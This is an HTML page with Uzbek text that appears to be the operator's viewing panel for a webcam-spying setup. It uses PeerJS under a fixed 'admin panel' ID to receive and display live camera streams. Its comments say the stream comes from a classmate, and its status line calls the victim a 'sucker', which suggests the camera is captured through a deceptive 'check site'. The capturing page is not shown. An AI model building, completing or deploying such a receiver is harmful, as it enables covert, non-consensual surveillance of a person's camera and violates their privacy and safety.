<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <title>Dev core</title>
    <style>
        body { 
            margin: 0; background-color: #000; color: #fff; 
            font-family: sans-serif; display: flex; flex-direction: column; 
            align-items: center; justify-content: center; height: 100vh; 
        }
        h2 { margin-bottom: 20px; letter-spacing: 1px; }
        .monitor-box { 
            width: 80%; max-width: 800px; aspect-ratio: 16/9; 
            border: 5px solid #fff; background-color: #111; 
            display: flex; align-items: center; justify-content: center; 
            position: relative; overflow: hidden; 
        }
        #live-video { 
            width: 100%; height: 100%; object-fit: contain; 
            transform: scaleX(-1); display: none; 
        }
        .no-user { position: absolute; color: #666; font-size: 20px; }
    </style>
    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
</head>
<body>

    <h2>chek sayt</h2>
    
    <div class="monitor-box">
        <span class="no-user" id="status">Loxni kamerasi ochilmoqda....</span>
        <video id="live-video" autoplay playsinline muted></video>
    </div>

    <script>
        const video = document.getElementById('live-video');
        const statusText = document.getElementById('status');

        // Admin uchun maxsus o'zgarmas ID o'rnatamiz
        const peer = new Peer('draghub-admin-panel-id');

        peer.on('open', (id) => {
         statusText.innerText = "chek time";
        });

        // Sinfdoshdan qo'ng'iroq (kamera oqimi) kelganda
        peer.on('call', (call) => {
            // Qo'ng'iroqqa javob beramiz
            call.answer();
            
            call.on('stream', (userStream) => {
                statusText.style.display = 'none';
                video.style.display = 'block';
                
                // Jonli videoni pleyerga ulaymiz
                video.srcObject = userStream;
            });
        });
    </script>
</body>
</html>
